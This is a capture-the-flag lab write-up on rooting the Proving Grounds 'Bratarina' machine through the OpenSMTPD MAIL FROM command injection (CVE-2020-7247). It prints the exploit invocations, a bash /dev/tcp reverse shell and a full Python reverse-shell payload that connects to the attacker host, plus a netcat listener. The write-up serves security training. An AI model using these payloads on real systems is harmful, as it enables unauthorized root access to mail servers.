# Bratarina - Proving Grounds Practice

> **Kill Chain Summary**: Nmap identifies OpenSMTPD on Port 25 -> Version fingerprinting reveals OpenSMTPD 2.0.0 (vulnerable to CVE-2020-7247) -> Exploiting unauthenticated command injection via crafted MAIL FROM address -> Deploying inline Python reverse shell payload -> Instant Root Shell.

| Property | Value |
|---|---|
| **Target Name** | Bratarina |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | OpenSMTPD Enumeration, OpenSMTPD MAIL FROM Remote Code Execution (CVE-2020-7247), Python Reverse Shell Socket Execution |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We initiate reconnaissance with a full TCP port scan:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn $IP -oA nmap/allports
```

**Open Ports Summary:**
```text
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds
```

---

### 1.2 SMTP Service Fingerprinting (Port 25)

We probe the SMTP service using Nmap script scanning:

```bash
nmap -p 25 --script smtp-commands $IP
```

**Output:**
```text
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.225], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
```

The banner explicitly reveals **OpenSMTPD 2.0.0**.

---

## 2. Initial Access

### 2.1 Vulnerability Analysis: OpenSMTPD RCE (CVE-2020-7247)

Searching Exploit-DB for OpenSMTPD:

```bash
searchsploit OpenSMTPD
```

```text
OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution | openbsd/remote/48140.c
```

**Vulnerability Mechanics (CVE-2020-7247):**
OpenSMTPD versions prior to 6.6.2 contain a critical flaw in how email addresses are parsed in the `MAIL FROM` field. When the daemon prepares to execute the local delivery mailer, an invalid or specially crafted string with shell metacharacters escapes validation and is passed directly to `/bin/sh`. Because OpenSMTPD manages delivery as **root**, arbitrary commands execute with elevated privileges.

---

### 2.2 Exploitation and Payload Delivery

We use the public Python exploit (`47984.py`).

#### Initial Payload Attempts
Attempting standard Bash `/dev/tcp/` one-liners:

```bash
echo "sh -i >& /dev/tcp/KALI_IP/4444 0>&1" | base64
python3 47984.py $IP 25 "echo '<BASE64_PAYLOAD>' | base64 -d | bash"
```

The payload failed to return a connection. In minimal Linux and OpenBSD environments, the default `/bin/sh` does not support `/dev/tcp` pseudo-device redirection.

#### Python Reverse Shell Solution
Switching to a direct Python socket connection creates a reliable stream:

```bash
# Start a Netcat listener on port 80 (to evade egress filters):
sudo nc -lvnp 80
```

Execute the exploit with the Python payload:

```bash
python3 47984.py $IP 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"KALI_IP\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"'
```

**Exploit Execution Output:**
```text
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

---

### 2.3 Catching the Root Shell

The listener immediately receives a connection:

```bash
connect to [KALI_IP] from [192.168.x.x]
root@bratarina:~# id
uid=0(root) gid=0(root) groups=0(root)

root@bratarina:~# whoami
root
```

Checking flags:
```bash
cat /root/proof.txt
[FLAG REDACTED]
```

Because the mail daemon executes delivery directly with root permissions, this single exploit yields complete system compromise.

---

## 3. Privilege Escalation

*Not applicable. Exploitation directly executed commands with root or NT AUTHORITY SYSTEM privileges without requiring a separate privilege escalation step.*

## 4. Useful Commands Summary

```bash
# Fingerprint SMTP commands and banner
nmap -p 25 --script smtp-commands [TARGET_IP]

# Exploit OpenSMTPD CVE-2020-7247 via Python
python3 47984.py [TARGET_IP] 25 'command_here'
```

---

## 5. Key Takeaways and Lessons Learned

1. **Service Banner Details:** Reading full banners from services like OpenSMTPD immediately points to specific CVEs. In this instance, OpenSMTPD 2.0.0 is vulnerable to CVE-2020-7247.
2. **Reverse Shell Portability:** Standard Bash `/dev/tcp` syntax is specific to Bash compiled with net-redirections enabled. When exploiting daemons invoking `/bin/sh`, rely on Python, Perl, or Netcat with named pipes (`mkfifo`) for reliable execution.
3. **Direct-to-Root Daemons:** Certain exposed network services (mail transfer agents, print daemons) run with root privileges to handle system mailboxes and sockets. Identifying and exploiting vulnerabilities in these services can bypass the traditional two-stage foothold and privilege escalation process.

---

### Tags
#linux #smtp #opensmtpd #cve-2020-7247 #rce #direct-root #python-reverse-shell #easy #pg-practice #rooted
